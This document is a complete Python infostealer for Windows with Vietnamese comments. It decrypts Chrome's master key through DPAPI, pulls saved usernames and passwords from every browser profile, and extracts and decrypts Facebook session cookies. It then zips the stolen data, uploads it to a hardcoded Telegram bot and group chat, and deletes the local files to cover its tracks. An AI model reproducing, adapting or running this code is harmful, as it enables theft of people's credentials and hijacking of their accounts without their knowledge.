#Full Credits to LimerBoy
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import requests
import webbrowser
import datetime
import zipfile


# URL = "https://bedental.vn/wp-content/uploads/2022/11/hot-girl_8.jpg"
# webbrowser.open(URL)    

__COOKIES__ = []

#GLOBAL CONSTANT
# Đường dẫn đến tệp Local State của Chrome
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
# Đường dẫn đến thư mục dữ liệu người dùng của Chrome
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

# Hàm để lấy khóa bí mật từ Chrome
def get_secret_key():
    try:
        #(1) Lấy secret key từ local state của Chrome
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Loại bỏ đuôi DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Không thể tìm thấy secret key của Chrome")
        return None
    
# Hàm để giải mã payload
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

# Hàm để tạo cipher
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

# Hàm để giải mã mật khẩu
def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Vector khởi tạo cho việc giải mã AES
        initialisation_vector = ciphertext[3:15]
        #(3-b) Lấy mật khẩu đã mã hóa bằng cách loại bỏ các byte cuối cùng
        #Mật khẩu đã mã hóa là 192 bit
        encrypted_password = ciphertext[15:]
        #(4) Tạo cipher để giải mã ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass[:-16].decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Không thể giải mã, phiên bản Chrome <80 không được hỗ trợ. Vui lòng kiểm tra.")
        return ""
    
# Hàm để lấy kết nối đến cơ sở dữ liệu
def get_db_connection(chrome_path_login_db,name_copy_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, name_copy_db)     
        return sqlite3.connect(name_copy_db)
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Không thể tìm thấy cơ sở dữ liệu của Chrome")
        return None
        

# Token của bot
TOKEN_BOT = "7226911349:AAGnHiKxkn5hKqsiz5hjqS4i0hLlY5gFDM4"

# ID của nhóm
TELEGRAM_GROUP_ID = "-4209748131"

# Function to send a file
def send_file(file_path):
    try:
        url = f'https://api.telegram.org/bot{TOKEN_BOT}/sendDocument'
        files = {'document': open(file_path, 'rb')}
        params = {'chat_id': TELEGRAM_GROUP_ID}
        response = requests.post(url, files=files, data=params)
        if response.status_code == 200:
            print("File đã được gửi thành công.")
        else:
            print("Không thể gửi file.")
    except Exception as e:
        print(f"Lỗi khi gửi file: {e}")

def create_txt_file(file_path, content):
    try:
        with open(file_path, mode='w', encoding='utf-8') as txt_file:
            txt_file.write(content)
      
    except Exception as e:
        print(f"Lỗi khi tạo file văn bản: {e}")

def compress_files_to_zip(files, zip_file_name):
    with zipfile.ZipFile(zip_file_name, 'w') as zipf:
        for file in files:
            zipf.write(file)

# Sửa đổi chương trình chính để lấy và giải mã cookie
def getcookies():
    try:
        secret_key = get_secret_key()
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
        # csv_files = []
        files_to_compress = [] 
        for folder in folders:
            	#(2) Lấy bản mã từ cơ sở dữ liệu sqlite
                folder_name = folder.split('Profile ')[-1] 
                cookie_db = os.path.normpath(r"%s\%s\Network\Cookies" % (CHROME_PATH, folder))
                conn = get_db_connection(cookie_db,"cookie_coppy.db")
                if secret_key and conn:
                    cursor = conn.cursor()
                    name_value_pairs = []
                    cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
                    for index, cookie in enumerate(cursor.fetchall()):
                        url = cookie[0]
                        name = cookie[1]
                        path = cookie[2]
                        ciphertext = cookie[3]  # Thay đổi index tương ứng với encrypted_value
                        if  ".facebook.com" in url:
                            decrypted_value = decrypt_password(ciphertext, secret_key)  # Thay đổi hàm giải mã tùy thuộc vào cách mã hóa được sử dụng
                            name_value_pairs.append(repr(f"{name} = {decrypted_value};"))

                    result_string = ''.join([s.replace("'", "").replace('"', '') for s in name_value_pairs])
                    file_name = f'cookie-profile-{folder_name}.txt'

                    cursor.close()
                    conn.close()
                    os.remove("cookie_coppy.db")
                    create_txt_file(file_name, result_string)
                    files_to_compress.append(file_name) 

                    
        compress_files_to_zip(files_to_compress, "cookies.zip")
        
        # Xóa tất cả các tệp txt đã tạo
        for file in files_to_compress:
            os.remove(file)

            
     
            
    except Exception as e:
        print("[ERR] %s"%str(e))


def getacc():
    try:
        #(1) Get secret key
        secret_key = get_secret_key()

        #Tìm kiếm hồ sơ người dùng hoặc thư mục mặc định (đây là nơi lưu trữ mật khẩu đăng nhập được mã hóa)
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
        csv_files = []
        for folder in folders:
            profile_name = folder.split('Profile ')[-1]  # Lấy phần số cuối cùng từ tên thư mục
            profile_name = f"Profile-{profile_name}"  # Đặt tên file dựa trên số của profile
            csv_file_name = f'decrypted_password_{profile_name}.csv'  # Tạo tên file với tên profile
            
            #Create Dataframe to store passwords
            with open(csv_file_name, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                csv_writer = csv.writer(decrypt_password_file, delimiter=',')
                csv_writer.writerow(["index","url","username","password"])
                
                # Lấy bản mã từ cơ sở dữ liệu sqlite
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))

                conn = get_db_connection(chrome_path_login_db,"chorm_coppy.db")
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            # Giải mã mật khẩu
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([index,url,username,decrypted_password])
                    
                    # Đóng kết nối với cơ sở dữ liệu
                    cursor.close()
                    conn.close()
                    os.remove("chorm_coppy.db") 
                csv_files.append(csv_file_name) 
            compress_files_to_zip(csv_files, 'passes.zip')
        for csv_file in csv_files:
            os.remove(csv_file)
    except Exception as e:
        print("[ERR] %s"%str(e))
if __name__ == '__main__':
    try:
        # Gọi hàm để tạo hai tệp zip
        getcookies()
        getacc()
        
        # Nén hai tệp zip thành một tệp zip mới
        with zipfile.ZipFile("merged.zip", 'w') as zipf:
            zipf.write("cookies.zip")
            zipf.write("passes.zip")
        send_file("merged.zip")

    except Exception as e:
        print("[ERR] %s" % str(e))
    finally:
        # Xóa các tệp zip ban đầu sau khi đã sử dụng xong
        if os.path.exists("cookies.zip"):
            os.remove("cookies.zip")
        if os.path.exists("passes.zip"):
            os.remove("passes.zip")
        if os.path.exists("merged.zip"):
            os.remove("merged.zip")
